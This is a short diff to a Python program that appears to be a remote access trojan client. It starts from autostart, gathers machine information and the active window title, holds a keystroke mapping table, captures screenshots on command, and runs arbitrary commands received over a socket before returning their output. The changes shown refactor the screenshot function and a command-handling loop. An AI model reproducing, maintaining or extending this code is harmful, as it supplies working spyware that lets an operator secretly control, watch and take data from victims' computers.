@@ -82,14 +82,6 @@ def pc_info():
         'activewindowtitle': get_window_title(),
     })
 
-
-def screenshot():
-    return str({
-        'screenshot': screen_bits(),
-        'width': str(bmp_info.bmiHeader.biWidth),
-        'height': str(bmp_info.bmiHeader.biHeight),
-    })
-
 shiftcodes = {
     49: '!', 50: '@', 51: '#', 52: '$', 53: '%',
     54: '^', 55: '&', 56: '*', 57: '(', 48: ')',
@@ -346,6 +338,7 @@ class ChildSocket(threading.Thread):
                 else:
                     stdoutput = exec_(data)
                 send(self.socket, stdoutput, mode)
+                del stdoutput
             except socket.error:
                 return
 
@@ -471,7 +464,7 @@ def from_autostart():
                     send(s, pc_info(), mode)
                     continue
                 if data == 'getScreen':
-                    send(s, screenshot(), mode)
+                    send(s, get_screenshot(), mode)
                     continue
                 if data.startswith('startChildSocket'):
                     send(s, start_child_socket(str(data.split(' ')[-1]), mode), mode)
@@ -489,7 +482,7 @@ def from_autostart():
                         elif data.startswith('startChildSocket'):
                             stdoutput = start_child_socket(str(data.split(' ')[-1]), mode)
                         elif data == 'getScreen':
-                            stdoutput = screenshot()
+                            stdoutput = get_screenshot()
                         else:
                             stdoutput = exec_(data)
                         send(s, stdoutput, mode=mode)
